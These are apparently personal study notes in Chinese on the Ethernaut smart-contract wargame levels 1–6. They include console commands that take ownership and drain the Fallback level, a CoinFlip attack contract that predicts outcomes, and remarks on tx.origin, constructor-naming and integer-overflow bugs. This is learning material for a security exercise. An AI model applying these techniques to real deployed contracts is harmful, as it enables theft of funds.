## Ethernaut


```
7.   
```

```
6. Token   溢出攻击   uint 就是  uint256   20-21 溢出 = type(uint).max-1
```

```
5. Telephone    了解下  调用者  tx.origin  

```

```
4. CoinFlip  -  这里 有几个坑   
第一个就是 用 address.call 去调用  之前不知道为啥一直跑不起来   这个俩个用处  1.当前推荐发送以太给另一个合约  2.直接调用其他合约的函数 
第二个就是 remix 提醒 gas limit  明明是ok的    钱包 metamask 用本地  跑的没反应  这里感觉最好用 hardhat  不断打log 才知道啥情况 
第三个就是   fallback 和  receive 函数里面不要写耗时的操作  不然gas 不够  抛异常  error - out of gas  

    function attackByInterface(address _addr) public {
        bool side = getFlip();
        ICoinFlip(_addr).flip(side);
    }

    // call 只推荐用于发送以太-在有fallback函数在情况下    其他情况下不推荐-也就是普通函数不推荐使用  但是也能用 
    function attackByCall(address _addr) public {
        bool side = getFlip();
       (bool sent, bytes memory data) = _addr.call(abi.encodeWithSignature("flip(bool)", side));
       require(sent, "Failed to call function");   
    }

```


```
3. Fallout - 这里构造函数不对   SWC-118   剩下非常简单了 
```

```
2. Fallback - 这里难在调用 
contribute() 是个 payable 函数  直接控制台 调用  在括号加 以太值

await contract.contribute({value:1})
await contract.sendTransaction({value:1})    触发了 receive()   Fallback() 
await contract.owner() === player
await contract.withdraw()
```

```
1.Hello Ethernaut - 做准备工作  领取测试以太  

await getBalance(player)
help()
await contract.abi
```


这里主要借鉴 
1. https://solidity-by-example.org/
2. https://ethernaut.openzeppelin.com/ 